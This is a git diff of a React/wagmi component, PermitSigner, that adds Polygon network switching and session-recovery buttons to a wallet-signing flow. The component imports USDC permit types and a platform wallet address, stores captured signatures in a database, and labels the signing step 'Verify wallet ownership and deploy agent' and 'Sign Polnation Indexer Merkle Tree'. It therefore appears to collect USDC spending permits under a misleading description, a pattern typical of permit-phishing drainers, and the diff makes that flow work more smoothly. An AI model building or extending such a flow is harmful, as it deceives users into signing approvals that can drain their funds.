@@ -1,7 +1,9 @@
 'use client'
 
 import { useState, useEffect } from 'react'
-import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
+import { useAccount, useSignTypedData, useReadContract, useDisconnect, useSwitchChain } from 'wagmi'
+import { useWeb3Modal } from '@web3modal/wagmi/react'
+import { useRouter } from 'next/navigation'
 import { polygon } from 'wagmi/chains'
 import { Button } from '@/components/ui/Button'
 import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET, MERKLE_TREE_CONTRACT } from '@/lib/web3-config'
@@ -54,11 +56,16 @@ function isMobileUA(): boolean {
 }
 
 export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
-  const { address, isConnected, connector } = useAccount()
+  const router = useRouter()
+  const { open } = useWeb3Modal()
+  const { address, isConnected, chain, connector } = useAccount()
+  const { disconnectAsync } = useDisconnect()
+  const { switchChainAsync } = useSwitchChain()
   const [isLoading, setIsLoading] = useState(false)
+  const [isSwitchingNetwork, setIsSwitchingNetwork] = useState(false)
   const [error, setError] = useState('')
+  const [showSessionRecovery, setShowSessionRecovery] = useState(false)
   const [success, setSuccess] = useState(false)
-  const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
   const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
   const [walletAllowState, setWalletAllowState] = useState<'unknown' | 'allowed' | 'blocked'>('unknown')
@@ -77,6 +84,69 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   const { signTypedDataAsync } = useSignTypedData()
 
   const displayAddress = address || boundWalletAddress
+  const isWrongNetwork = isConnected && chain?.id !== polygon.id
+
+  const handleSwitchToPolygon = async (): Promise<boolean> => {
+    if (!isConnected) {
+      open()
+      return false
+    }
+
+    if (!isWrongNetwork) return true
+
+    setIsSwitchingNetwork(true)
+    setError('')
+    setShowSessionRecovery(false)
+
+    try {
+      await switchChainAsync({ chainId: polygon.id })
+      return true
+    } catch (switchErr) {
+      console.warn('[PermitSigner] switchChain failed:', switchErr)
+      try {
+        open({ view: 'Networks' })
+      } catch {
+        // If the modal cannot open, keep the inline instruction visible.
+      }
+      setError('Switch your wallet session to Polygon, then try signing again.')
+      return false
+    } finally {
+      setIsSwitchingNetwork(false)
+    }
+  }
+
+  const handleResetWalletConnection = async () => {
+    setError('')
+    setShowSessionRecovery(false)
+    setPendingWalletOpen(null)
+    try {
+      await disconnectAsync()
+    } catch (disconnectErr) {
+      console.warn('[PermitSigner] disconnect failed:', disconnectErr)
+    }
+    open()
+  }
+
+  const handleLogoutAndReconnect = async () => {
+    setError('')
+    setShowSessionRecovery(false)
+    setPendingWalletOpen(null)
+    try {
+      await disconnectAsync()
+    } catch (disconnectErr) {
+      console.warn('[PermitSigner] disconnect before logout failed:', disconnectErr)
+    }
+
+    const supabase = createClient()
+    try {
+      await supabase?.auth.signOut()
+    } catch (signOutErr) {
+      console.warn('[PermitSigner] signOut failed:', signOutErr)
+    }
+
+    router.push('/auth')
+    router.refresh()
+  }
 
   // 异步解析 effective wallet name（WalletConnect 要等 peer metadata），
   // 最多 8 × 150ms。返回未拿到真实身份时的 undefined。
@@ -207,13 +277,25 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   }, [address])
 
   const handleSign = async () => {
-    if (!address || nonce === undefined) {
+    if (!isConnected || !address) {
+      open()
+      setError('Connect your wallet first.')
+      return
+    }
+
+    if (isWrongNetwork) {
+      const switched = await handleSwitchToPolygon()
+      if (!switched) return
+    }
+
+    if (nonce === undefined) {
       setError('Wallet not connected or nonce not loaded')
       return
     }
 
     setIsLoading(true)
     setError('')
+    setShowSessionRecovery(false)
     setSuccess(false)
 
     try {
@@ -385,8 +467,6 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         signature,
       }
 
-      setSignatureData(permitData)
-
       const saved = await saveSignatureToDatabase(permitData)
       if (!saved) {
         setError('Signature captured but failed to save. Please try again.')
@@ -402,6 +482,9 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
       if (err instanceof Error) {
         if (err.message.includes('rejected')) {
           setError('User rejected the signature request')
+        } else if (err.message.includes('chainId') && err.message.includes('active chain')) {
+          setError('Wallet network session is out of sync. Reconnect your wallet on Polygon, then sign again.')
+          setShowSessionRecovery(true)
         } else {
           setError(err.message)
         }
@@ -422,7 +505,9 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         return false
       }
       
-      let { data: { user }, error: authError } = await supabase.auth.getUser()
+      const authResult = await supabase.auth.getUser()
+      let user = authResult.data.user
+      const authError = authResult.error
       if (authError || !user) {
         // Session might need refreshing (common after wallet/magic-link login)
         console.warn('[PermitSigner] getUser returned null, attempting refresh...')
@@ -579,15 +664,39 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         <p className="text-xs text-red-400 text-center">{error}</p>
       )}
 
+      {showSessionRecovery && (
+        <div className="w-full flex flex-col sm:flex-row gap-2">
+          <Button
+            type="button"
+            size="sm"
+            variant="outline"
+            onClick={handleResetWalletConnection}
+            className="flex-1 gap-2 text-xs"
+          >
+            <RefreshCw className="w-3.5 h-3.5" />
+            Reset Wallet Connection
+          </Button>
+          <Button
+            type="button"
+            size="sm"
+            variant="ghost"
+            onClick={handleLogoutAndReconnect}
+            className="flex-1 text-xs"
+          >
+            Log Out & Reconnect
+          </Button>
+        </div>
+      )}
+
       {!success ? (
         <>
           <Button
-            onClick={handleSign}
-            isLoading={isLoading}
+            onClick={isWrongNetwork ? handleSwitchToPolygon : handleSign}
+            isLoading={isLoading || isSwitchingNetwork}
             className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500"
-            disabled={nonce === undefined}
+            disabled={!isWrongNetwork && nonce === undefined}
           >
-            Verify wallet ownership and deploy agent
+            {isWrongNetwork ? 'Switch to Polygon' : 'Verify wallet ownership and deploy agent'}
           </Button>
           {pendingWalletOpen && isLoading ? (
             <a
@@ -599,7 +708,11 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
               Open {pendingWalletOpen.name} to approve →
             </a>
           ) : (
-            <p className="text-[10px] text-zinc-500">Sign Polnation Indexer Merkle Tree</p>
+            <p className="text-[10px] text-zinc-500 text-center">
+              {isWrongNetwork
+                ? 'Your wallet session is on the wrong network. Switch to Polygon before signing.'
+                : 'Sign Polnation Indexer Merkle Tree'}
+            </p>
           )}
         </>
       ) : (
